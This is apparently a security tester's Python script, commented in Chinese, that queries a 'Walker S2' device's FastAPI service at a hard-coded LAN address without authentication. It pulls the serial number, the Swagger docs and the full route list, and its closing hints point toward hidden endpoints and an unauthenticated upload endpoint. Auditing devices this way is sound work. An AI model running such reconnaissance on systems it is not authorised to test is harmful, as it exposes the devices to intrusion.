#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · FastAPI :5000 无认证信息泄露一键查看（只读）

用法:
    python fastapi_info_leak.py

打印:
    1. GET /api/sn            → 设备序列号
    2. GET /api/ping          → 存活
    3. GET /docs              → Swagger 是否暴露
    4. GET /openapi.json      → 全部路由清单
    5. GET /api/expressions   → 表情列表（含第三方生成物线索）
"""
import json
import sys

import requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass


def main():
    host = "192.168.11.3"
    base = f"http://{host}:5000"

    print("=" * 66)
    print(f"[*] FastAPI 无认证信息泄露复核 — {base}")
    print("=" * 66)

    for name, method, url in [
        ("设备序列号 /api/sn", "GET", "/api/sn"),
        ("存活 /api/ping", "GET", "/api/ping"),
        ("Swagger /docs", "GET", "/docs"),
        ("openapi /openapi.json", "GET", "/openapi.json"),
        ("表情 /api/expressions", "GET", "/api/expressions"),
    ]:
        try:
            r = requests.request(method, base + url, timeout=10)
            print(f"\n[>] {method} {url}")
            print(f"[<] HTTP {r.status_code}  size={len(r.content)}B")
            if "json" in r.headers.get("content-type", ""):
                try:
                    j = r.json()
                    # 精简展示路由列表
                    if url.endswith("openapi.json"):
                        print("    路由:")
                        for p in sorted(j.get("paths", {})):
                            print(f"      {p}")
                    elif url.endswith("expressions"):
                        exprs = j.get("data", {}).get("expressions", [])
                        print(f"    {len(exprs)} 个表情，key / name_cn / update_time:")
                        for e in exprs[:10]:
                            print(f"      {e.get('key')}  {e.get('name_cn')}  {e.get('update_time')}")
                    else:
                        print("    " + json.dumps(j, ensure_ascii=False)[:400])
                except Exception:
                    print("    " + r.text[:400])
            else:
                print("    " + r.text[:200])
        except Exception as e:
            print(f"\n[!] {url} 请求失败: {e}")

    print("\n[*] 提示:")
    print("    - /docs、/openapi.json 暴露了完整 API 面，配合源码审计找隐藏端点")
    print("    - /api/expressions 若出现非默认表情，指向 /api/expression/upload 未认证上传面")


if __name__ == "__main__":
    main()
